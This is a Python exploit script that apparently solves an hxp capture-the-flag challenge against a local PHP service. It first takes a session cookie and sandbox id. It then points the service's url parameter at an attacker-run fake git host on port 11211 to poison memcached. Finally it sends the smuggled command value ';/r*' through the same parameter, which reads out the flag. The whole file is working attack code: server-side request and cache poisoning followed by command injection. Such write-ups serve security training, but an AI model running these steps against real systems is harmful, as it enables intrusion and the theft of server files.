import re
import requests


VICTIM_ADDR = 'http://localhost:8010/'
FAKE_GIT_ADDR = 'https://fakegit.cursed.page:11211/'


if __name__ == '__main__':
    response = requests.get(VICTIM_ADDR)
    cookies = response.cookies
    sandbox_id = re.search('<code>(.*?)</code>', response.text).group(1).rstrip('=')

    print(f'Got PHP cookie {cookies["PHPSESSID"]} and sandbox id {sandbox_id}')

    print(f'Poisoning memcached')
    response = requests.get(VICTIM_ADDR, cookies=cookies, params={
        'url': f'{FAKE_GIT_ADDR}{sandbox_id}',
    })
    assert 'analysis failed' in response.text, f'Got an unexpected response: {response.text}'

    print(f'Memcached is poisoned, reading flag')
    response = requests.get(VICTIM_ADDR, cookies=cookies, params={
        'url': ';/r*',
    })
    assert 'hxp{' in response.text, f'Unexpected response: {response.text}'
    print(re.search('(hxp{.*})', response.text).group(1))
